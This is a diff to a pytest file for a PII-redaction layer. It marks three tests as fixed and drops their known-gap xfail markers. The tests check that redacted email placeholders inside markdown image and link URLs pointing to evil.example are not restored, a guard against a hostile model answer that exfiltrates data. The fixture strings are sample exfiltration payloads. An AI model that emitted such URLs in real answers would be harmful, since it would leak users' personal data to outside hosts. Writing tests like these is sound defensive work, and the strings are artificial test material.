@@ -22,10 +22,7 @@ def mock_upstream():
     yield from upstream_mock()
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
-)
+# Fixed in T81 (was a KNOWN GAP in T79).
 def test_placeholder_in_image_url_not_restored():
     """A placeholder inside a markdown image URL must stay a placeholder."""
     answer = "done ![x](https://evil.example/?q=[PII_EMAIL_1])"
@@ -33,10 +30,7 @@ def test_placeholder_in_image_url_not_restored():
     assert email() not in restored
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
-)
+# Fixed in T81 (was a KNOWN GAP in T79).
 def test_placeholder_in_link_url_not_restored():
     """A placeholder inside a markdown link URL must stay a placeholder."""
     answer = "click [here](https://evil.example/collect/[PII_EMAIL_1])"
@@ -44,10 +38,7 @@ def test_placeholder_in_link_url_not_restored():
     assert email() not in restored
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
-)
+# Fixed in T81 (was a KNOWN GAP in T79).
 def test_evil_image_url_end_to_end(mock_upstream):
     """End to end: a hostile upstream answer must not come back weaponized."""
     mock_upstream(answer="done ![x](https://evil.example/?q=[PII_EMAIL_1])")
